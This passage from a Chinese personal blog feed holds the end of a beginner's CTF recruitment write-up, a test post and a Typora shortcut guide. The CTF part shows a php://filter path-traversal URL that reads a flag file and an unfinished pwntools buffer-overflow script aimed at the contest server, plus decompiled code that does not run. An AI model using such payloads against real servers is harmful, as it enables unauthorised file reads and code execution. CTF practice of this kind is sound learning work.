src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212633273.png" alt="image-20191117212633273"></p><p>访问<code>read_file.php</code>，得到  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212728303.png" alt="image-20191117212728303"></p><p>访问<code>no_flag_here.php</code>  ，构造参数进入根目录  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117203840679.png" alt="image-20191117203840679"></p><p>然而！emmm这个scandir怎么获取这个flag文件内容啊！！！</p><blockquote><p>看了大师傅的WriteUP，发现PHP还可以这么读取文件…（下面 </p></blockquote><p>构造<code>file=php://filter/read=convert.base64-encode/resource=</code>+绝对路径</p><p><a href="http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php" target="_blank" rel="noopener">http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php</a></p><p>或者</p><p><a href="http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php" target="_blank" rel="noopener">http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php</a></p><p>得到一串Base64字符串</p><p><code>PD9waHANCiAgICAvL0FzdXJpe1dFQl9XSU5ORVJ9DQo/Pg==</code>  </p><p>解码后：</p><pre><code>&lt;?php    //Asuri{WEB_WINNER}?&gt;</code></pre><p>flag: <code>Asuri{WEB_WINNER}</code></p><h2 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212839633.png" alt="image-20191117212839633"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213445330.png" alt="image-20191117213445330"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212904694.png" alt="image-20191117212904694"></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment" spellcheck="true"># 引入pwntools库</span><span class="token keyword">import</span> timesh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'49.235.243.206'</span><span class="token punctuation">,</span> <span class="token number">9001</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 创建与靶场服务器的连接</span>offset <span class="token operator">=</span> <span class="token number">0x60</span><span class="token operator">+</span><span class="token number">0x8</span>  <span class="token comment" spellcheck="true"># 偏移</span>system_addr <span class="token operator">=</span> <span class="token number">0x400766</span>  <span class="token comment" spellcheck="true"># system函数地址</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input your passworld size'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 向程序发送数据</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input your password'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> offset <span class="token operator">*</span> b<span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 构造攻击数据</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 向程序发送数据</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 将控制流从程序转移到自己这里</span></code></pre><p>完了不会写，嘤嘤嘤</p><h2 id="medium-rev"><a href="#medium-rev" class="headerlink" title="medium_rev"></a>medium_rev</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># encoding: utf-8</span><span class="token comment" spellcheck="true"># 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pyc</span><span class="token keyword">def</span> <span class="token function">encrypt_for_each</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">100</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> i <span class="token operator">^</span> <span class="token number">77</span>        <span class="token keyword">yield</span> tmp        None<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    iters <span class="token operator">=</span> encrypt_for_each<span class="token punctuation">(</span><span class="token punctuation">)</span>    enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>m<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">in</span> zip<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> m <span class="token operator">^</span> k <span class="token operator">^</span> iters<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>        enc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">return</span> enc<span class="token keyword">def</span> <span class="token function">generate_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">check_prime</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> num <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    test <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">8</span><span class="token punctuation">,</span>        <span class="token number">61</span><span class="token punctuation">,</span>        <span class="token number">85</span><span class="token punctuation">,</span>        <span class="token number">25</span><span class="token punctuation">,</span>        <span class="token number">121</span><span class="token punctuation">,</span>        <span class="token number">53</span><span class="token punctuation">,</span>        <span class="token number">26</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">81</span><span class="token punctuation">,</span>        <span class="token number">52</span><span class="token punctuation">,</span>        <span class="token number">124</span><span class="token punctuation">,</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">137</span><span class="token punctuation">,</span>        <span class="token number">56</span><span class="token punctuation">,</span>        <span class="token number">94</span><span class="token punctuation">,</span>        <span class="token number">107</span><span class="token punctuation">,</span>        <span class="token number">59</span><span class="token punctuation">,</span>        <span class="token number">132</span><span class="token punctuation">,</span>        <span class="token number">90</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">51</span><span class="token punctuation">,</span>        <span class="token number">46</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">127</span><span class="token punctuation">,</span>        <span class="token number">35</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">134</span><span class="token punctuation">,</span>        <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token number">73</span><span class="token punctuation">,</span>        <span class="token number">32</span><span class="token punctuation">,</span>        <span class="token number">66</span><span class="token punctuation">,</span>        <span class="token number">99</span><span class="token punctuation">,</span>        <span class="token number">7</span><span class="token punctuation">,</span>        <span class="token number">69</span><span class="token punctuation">,</span>        <span class="token number">122</span><span class="token punctuation">,</span>        <span class="token number">4</span><span class="token punctuation">,</span>        <span class="token number">142</span><span class="token punctuation">,</span>        <span class="token number">23</span><span class="token punctuation">,</span>        <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token number">109</span><span class="token punctuation">,</span>        <span class="token number">60</span><span class="token punctuation">,</span>        <span class="token number">79</span><span class="token punctuation">,</span>        <span class="token number">36</span><span class="token punctuation">,</span>        <span class="token number">62</span><span class="token punctuation">,</span>        <span class="token number">5</span><span class="token punctuation">,</span>        <span class="token number">104</span><span class="token punctuation">,</span>        <span class="token number">102</span><span class="token punctuation">,</span>        <span class="token number">14</span><span class="token punctuation">,</span>        <span class="token number">58</span><span class="token punctuation">,</span>        <span class="token number">149</span><span class="token punctuation">,</span>        <span class="token number">31</span><span class="token punctuation">,</span>        <span class="token number">96</span><span class="token punctuation">,</span>        <span class="token number">68</span><span class="token punctuation">,</span>        <span class="token number">114</span><span class="token punctuation">,</span>        <span class="token number">116</span><span class="token punctuation">,</span>        <span class="token number">11</span><span class="token punctuation">,</span>        <span class="token number">95</span><span class="token punctuation">,</span>        <span class="token number">87</span><span class="token punctuation">,</span>        <span class="token number">146</span><span class="token punctuation">,</span>        <span class="token number">123</span><span class="token punctuation">,</span>        <span class="token number">15</span><span class="token punctuation">,</span>        <span class="token number">135</span><span class="token punctuation">,</span>        <span class="token number">33</span><span class="token punctuation">,</span>        <span class="token number">37</span><span class="token punctuation">,</span>        <span class="token number">110</span><span class="token punctuation">,</span>        <span class="token number">19</span><span class="token punctuation">,</span>        <span class="token number">106</span><span class="token punctuation">,</span>        <span class="token number">30</span><span class="token punctuation">,</span>        <span class="token number">130</span><span class="token punctuation">,</span>        <span class="token number">101</span><span class="token punctuation">,</span>        <span class="token number">97</span><span class="token punctuation">,</span>        <span class="token number">98</span><span class="token punctuation">,</span>        <span class="token number">141</span><span class="token punctuation">,</span>        <span class="token number">2</span><span class="token punctuation">,</span>        <span class="token number">47</span><span class="token punctuation">,</span>        <span class="token number">6</span><span class="token punctuation">,</span>        <span class="token number">24</span><span class="token punctuation">,</span>        <span class="token number">131</span><span class="token punctuation">,</span>        <span class="token number">16</span><span class="token punctuation">,</span>        <span class="token number">111</span><span class="token punctuation">,</span>        <span class="token number">150</span><span class="token punctuation">,</span>        <span class="token number">55</span><span class="token punctuation">,</span>        <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token number">76</span><span class="token punctuation">,</span>        <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token number">138</span><span class="token punctuation">,</span>        <span class="token number">64</span><span class="token punctuation">,</span>        <span class="token number">120</span><span class="token punctuation">,</span>        <span class="token number">118</span><span class="token punctuation">,</span>        <span class="token number">29</span><span class="token punctuation">,</span>        <span class="token number">145</span><span class="token punctuation">,</span>        <span class="token number">147</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">113</span><span class="token punctuation">,</span>        <span class="token number">103</span><span class="token punctuation">,</span>        <span class="token number">40</span><span class="token punctuation">,</span>        <span class="token number">92</span><span class="token punctuation">,</span>        <span class="token number">71</span><span class="token punctuation">,</span>        <span class="token number">72</span><span class="token punctuation">,</span>        <span class="token number">129</span><span class="token punctuation">,</span>        <span class="token number">139</span><span class="token punctuation">,</span>        <span class="token number">100</span><span class="token punctuation">,</span>        <span class="token number">63</span><span class="token punctuation">,</span>        <span class="token number">133</span><span class="token punctuation">,</span>        <span class="token number">42</span><span class="token punctuation">,</span>        <span class="token number">125</span><span class="token punctuation">,</span>        <span class="token number">74</span><span class="token punctuation">,</span>        <span class="token number">88</span><span class="token punctuation">,</span>        <span class="token number">143</span><span class="token punctuation">,</span>        <span class="token number">144</span><span class="token punctuation">,</span>        <span class="token number">38</span><span class="token punctuation">,</span>        <span class="token number">140</span><span class="token punctuation">,</span>        <span class="token number">67</span><span class="token punctuation">,</span>        <span class="token number">119</span><span class="token punctuation">,</span>        <span class="token number">136</span><span class="token punctuation">,</span>        <span class="token number">115</span><span class="token punctuation">,</span>        <span class="token number">54</span><span class="token punctuation">,</span>        <span class="token number">21</span><span class="token punctuation">,</span>        <span class="token number">50</span><span class="token punctuation">,</span>        <span class="token number">108</span><span class="token punctuation">,</span>        <span class="token number">128</span><span class="token punctuation">,</span>        <span class="token number">57</span><span class="token punctuation">,</span>        <span class="token number">112</span><span class="token punctuation">,</span>        <span class="token number">43</span><span class="token punctuation">,</span>        <span class="token number">84</span><span class="token punctuation">,</span>        <span class="token number">70</span><span class="token punctuation">,</span>        <span class="token number">78</span><span class="token punctuation">,</span>        <span class="token number">28</span><span class="token punctuation">,</span>        <span class="token number">41</span><span class="token punctuation">,</span>        <span class="token number">93</span><span class="token punctuation">,</span>        <span class="token number">44</span><span class="token punctuation">,</span>        <span class="token number">13</span><span class="token punctuation">,</span>        <span class="token number">18</span><span class="token punctuation">,</span>        <span class="token number">10</span><span class="token punctuation">,</span>        <span class="token number">48</span><span class="token punctuation">,</span>        <span class="token number">27</span><span class="token punctuation">,</span>        <span class="token number">83</span><span class="token punctuation">,</span>        <span class="token number">65</span><span class="token punctuation">,</span>        <span class="token number">17</span><span class="token punctuation">,</span>        <span class="token number">75</span><span class="token punctuation">,</span>        <span class="token number">126</span><span class="token punctuation">,</span>        <span class="token number">39</span><span class="token punctuation">,</span>        <span class="token number">49</span><span class="token punctuation">,</span>        <span class="token number">91</span><span class="token punctuation">,</span>        <span class="token number">34</span><span class="token punctuation">,</span>        <span class="token number">82</span><span class="token punctuation">,</span>        <span class="token number">45</span><span class="token punctuation">,</span>        <span class="token number">148</span><span class="token punctuation">,</span>        <span class="token number">105</span><span class="token punctuation">,</span>        <span class="token number">89</span><span class="token punctuation">,</span>        <span class="token number">117</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">lambda</span> <span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">continue</span><span class="token punctuation">[</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">.</span><span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>filter<span class="token punctuation">(</span>check_prime<span class="token punctuation">,</span> test<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> key<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> generate_key<span class="token punctuation">(</span><span class="token punctuation">)</span>    msg <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">21</span><span class="token punctuation">,</span>        <span class="token number">167</span><span class="token punctuation">,</span>        <span class="token number">66</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">27</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">119</span><span class="token punctuation">,</span>        <span class="token number">42</span><span class="token punctuation">,</span>        <span class="token number">99</span><span class="token punctuation">,</span>        <span class="token number">68</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">13</span><span class="token punctuation">,</span>        <span class="token number">166</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">120</span><span class="token punctuation">,</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">59</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">40</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">233</span><span class="token punctuation">,</span>        <span class="token number">41</span><span class="token punctuation">,</span>        <span class="token number">67</span><span class="token punctuation">,</span>        <span class="token number">108</span><span class="token punctuation">,</span>        <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token number">179</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">36</span><span class="token punctuation">,</span>        <span class="token number">31</span><span class="token punctuation">,</span>        <span class="token number">107</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">4</span><span class="token punctuation">,</span>        <span class="token number">75</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'encryt message is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>lambda .0: continue[ i for i in .0 ]</code> 这个<code>.0</code>执行不了啊emmm</p><p>我换成x也报错唉！</p><h2 id="middle-pwn"><a href="#middle-pwn" class="headerlink" title="middle_pwn"></a>middle_pwn</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213404793.png" alt="image-20191117213404793"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213417542.png" alt="image-20191117213417542"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/%E6%A6%9C%E5%8D%95.png" alt="榜单.png"> </p><p>第一次打CTF呢，虽然只拿了个第六，还拿了个娃娃233  </p><p>除了石榴园的真的没多少打这个比赛的呀。  </p><p>我好菜啊，这次一题pwn都没写出来，好难过嘤嘤嘤    </p><p>现场查BurpSuite怎么用也是绝了（那节培训我没去emmm   </p><p>总之CTF还是挺好玩的哈哈哈哈，有空还是要好好学一波呢！ </p><blockquote><p><del>等我有空再折腾一下，搭个博客吧 咕咕咕</del></p></blockquote><blockquote><p>20191128 更新：<br>我来折腾了，嘻嘻嘻！   </p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/2019/11/28/test/"/>
      <url>/2019/11/28/test/</url>
      
        <content type="html"><![CDATA[<h1 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下"></a>测试一下</h1><p>再来一下哈~</p><p>喵~~<br><strong>嘿嘿嘿</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>typora_tips 一些关于typora的快捷键</title>
      <link href="/2019/08/29/typora_tips/"/>
      <url>/2019/08/29/typora_tips/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>​        随便练练typora，参考了一些网上的资料，顺便记录一下，方便后面查阅哈~</p><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a><strong>标题</strong></h2><p><code>ctrl + 数字键</code></p><p>最多支持到六级标题</p><blockquote><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1></blockquote><blockquote><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2></blockquote><blockquote><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3></blockquote><blockquote><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4></blockquote><blockquote><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5></blockquote><blockquote><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6></blockquote><h3 id="取消标题"><a href="#取消标题" class="headerlink" title="取消标题"></a><strong>取消标题</strong></h3><p>​    <code>ctrl + 数字0</code></p><blockquote><h5 id="标题-1"><a href="#标题-1" class="headerlink" title="标题"></a>标题</h5><p>取消标题</p></blockquote><h2 id="加粗"><a href="#加粗" class="headerlink" title="加粗"></a><strong>加粗</strong></h2><p><code>ctrl + B</code></p><blockquote><p><strong>这是加粗</strong></p></blockquote><h2 id="倾斜"><a href="#倾斜" class="headerlink" title="倾斜"></a><strong>倾斜</strong></h2><p><code>ctrl + I</code></p><blockquote><p><em>这是倾斜</em></p></blockquote><h2 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a><strong>下划线</strong></h2><p><code>ctrl + U</code></p><blockquote><p><u>这是下划线</u></p></blockquote><h2 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a><strong>删除线</strong></h2><p><code>alt + shift + 5</code></p><blockquote><p><del>这是删除线</del></p></blockquote><hr><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a><strong>无序列表</strong></h2> <a id="more"></a> <p><code>- + space + enter</code></p><blockquote><ul><li><p>miao </p></li><li><p>miaomiao!</p><ul><li><p>嵌套</p><ul><li>再来嵌套</li></ul></li><li><p>上一个层次</p></li></ul></li><li><p>喵！</p></li></ul></blockquote><h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a><strong>有序列表</strong></h2><p><code>数字键. + space + enter</code></p><ol><li>第一个</li><li>第二个<ol><li>嵌套一下</li><li>再来一下<ol><li>再嵌套一个</li></ol></li><li>继续</li></ol></li><li>继续来</li><li>就这样吧</li></ol><h2 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a><strong>任务列表</strong></h2><p><code>- []</code> TODO</p><p><code>- [x]</code>已完成</p><blockquote><ul><li><input disabled="" type="checkbox"> 这是待完成的</li><li><input checked="" disabled="" type="checkbox"> 这个已完成了</li></ul></blockquote><hr><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a><strong>引用</strong></h2><p><code>&gt; + space + enter</code></p><p>或者</p><p><code>ctrl + shift + Q</code></p><blockquote><p>这就是引用</p></blockquote><blockquote><p>这也是</p><blockquote><p>​    还可以嵌套引用</p><blockquote><p>​    再来一个</p></blockquote><p>这也行</p></blockquote><p>一样的</p></blockquote><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a><strong>插入图片</strong></h2><p><code>ctrl + shift + I</code></p><p>网上说用<code>MPic</code>做图床挺不错的。（还没试过</p><p><img src="/2019/08/29/typora_tips/cat.jpg" alt="喵啊"></p><p>直接拖进来也行</p><h2 id="插入链接"><a href="#插入链接" class="headerlink" title="插入链接"></a><strong>插入链接</strong></h2><p><code>ctrl + K</code></p><blockquote><p><a href="https://miaotony.github.io" target="_blank" rel="noopener">这是链接，跳转到我的博客哈</a></p></blockquote><h2 id="插入表格"><a href="#插入表格" class="headerlink" title="插入表格"></a><strong>插入表格</strong></h2><p><code>ctrl + T</code></p><table><thead><tr><th>mm</th><th>text</th></tr></thead><tbody><tr><td>测试</td><td>再测试</td></tr><tr><td>123</td><td>456</td></tr></tbody></table><h2 id="插入代码"><a href="#插入代码" class="headerlink" title="插入代码"></a><strong>插入代码</strong></h2><h3 id="单行代码（文中的代码）"><a href="#单行代码（文中的代码）" class="headerlink" title="单行代码（文中的代码）"></a>单行代码（文中的代码）</h3><p>ctrl + shift + `</p><blockquote><p>`输入代码`</p></blockquote><h3 id="多行代码（代码块）"><a href="#多行代码（代码块）" class="headerlink" title="多行代码（代码块）"></a>多行代码（代码块）</h3><p><code>ctrl + shift + K</code></p><blockquote><p>``` </p><p>输入代码</p><p>```</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello world!\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Python</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, this is C."</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// C</span></code></pre><pre class=" language-matlab"><code class="language-matlab"><span class="token function">disp</span><span class="token punctuation">(</span>"Hello<span class="token punctuation">,</span> this is MATLAB<span class="token punctuation">.</span>"<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">% MATLAB</span></code></pre><pre class=" language-lua"><code class="language-lua"><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Hello, this is lua."</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">-- lua</span></code></pre><h2 id="插入表情"><a href="#插入表情" class="headerlink" title="插入表情"></a><strong>插入表情</strong></h2><p><code>:名称:</code></p><p>(英文状态下)</p><p><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f431.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f431.png?v8">🐱</span> <span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f436.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f436.png?v8">🐶</span></p><p><img src="/2019/08/29/typora_tips/1.png" alt="示例"></p><p>PS：微软输入法可以用<code>ctrl + shift + B</code>弹出表情窗口。</p><p>😀👌</p><h2 id="插入分割线"><a href="#插入分割线" class="headerlink" title="插入分割线"></a><strong>插入分割线</strong></h2><p><code>---</code></p><blockquote><p>下面是分割线</p><hr></blockquote><h2 id="插入高亮显示"><a href="#插入高亮显示" class="headerlink" title="插入高亮显示"></a><strong>插入高亮显示</strong></h2><p><code>==中间写文字==</code></p><blockquote><p>==这是高亮==</p></blockquote><h2 id="插入脚注"><a href="#插入脚注" class="headerlink" title="插入脚注"></a><strong>插入脚注</strong></h2><p><code>文字[^脚注]</code></p><blockquote><p>示例<a href="这是脚注啦。">^1</a></p></blockquote><h2 id="插入公式"><a href="#插入公式" class="headerlink" title="插入公式"></a><strong>插入公式</strong></h2><p><code>ctrl + shift + M</code></p><p>或者</p><p>行内公式（内联公式）：  <code>$公式$</code></p><p>行间公式：     <code>$$ 公式 $$</code></p><p>$$<br>\lim_{x\to +\infty} \frac{1}{x}=0<br>$$<br>加个框试试（<code>\boxed{}</code>）：<br>$$<br>\boxed{ \overrightarrow{AB}}<br>$$</p><blockquote><p>这是行内公式 $ \sqrt[3]{test} $ ，妙啊~</p></blockquote><p>具体的还得慢慢看呢。</p><p>顺便学一波<code>LaTex</code>也挺不错的~</p><h2 id="插入目录"><a href="#插入目录" class="headerlink" title="插入目录"></a><strong>插入目录</strong></h2><p><code>[toc]  + ENTER</code></p><blockquote><p>就是最上面那个啦~</p></blockquote><hr><h2 id="新建文件"><a href="#新建文件" class="headerlink" title="新建文件"></a><strong>新建文件</strong></h2><p><code>ctrl + N</code>    </p><h2 id="选中中文-英文"><a href="#选中中文-英文" class="headerlink" title="选中中文/英文"></a><strong>选中中文/英文</strong></h2><p><code>ctrl + D</code></p><p>miao miao~ </p><p><code>ctrl + Shift + 左/右</code> 快速选中整个词语/单词。</p><h2 id="选中整行"><a href="#选中整行" class="headerlink" title="选中整行"></a><strong>选中整行</strong></h2><p><code>ctrl + L</code></p><h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a><strong>查找</strong></h2><p><code>ctrl + F</code></p><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a><strong>替换</strong></h2><p><code>ctrl + H</code></p><h2 id="跳转到开头-结尾"><a href="#跳转到开头-结尾" class="headerlink" title="跳转到开头/结尾"></a><strong>跳转到开头/结尾</strong></h2><p><code>ctrl + HOME</code> 跳转至文章开头</p><p><code>ctrl + END</code>   跳转至文章末尾</p><h2 id="打开文件（笔记）"><a href="#打开文件（笔记）" class="headerlink" title="打开文件（笔记）"></a><strong>打开文件（笔记）</strong></h2><p><code>ctrl + P</code></p><h2 id="全屏显示"><a href="#全屏显示" class="headerlink" title="全屏显示"></a><strong>全屏显示</strong></h2><p><code>F11</code></p><h2 id="侧边栏"><a href="#侧边栏" class="headerlink" title="侧边栏"></a><strong>侧边栏</strong></h2><p><code>ctrl + shift + L</code></p><h2 id="清除格式"><a href="#清除格式" class="headerlink" title="清除格式"></a><strong>清除格式</strong></h2><p><code>ctrl + \</code></p><h2 id="切换到代码模式"><a href="#切换到代码模式" class="headerlink" title="切换到代码模式"></a><strong>切换到代码模式</strong></h2><p><code>ctrl + /</code></p><p><strong><em>==etc.==</em></strong></p><p>还有挺多还要慢慢去发掘呢~</p><hr><p>顺便说一下</p><p><code>Snipaste</code> 这个截图工具挺强大的</p><p><a href="https://zh.snipaste.com/" target="_blank" rel="noopener">官网</a> <a href="https://zh.snipaste.com/" target="_blank" rel="noopener">https://zh.snipaste.com/</a></p><blockquote><p>本文搬运自我的csdn博客啦~</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tips </category>
          
      </categories>
      
      
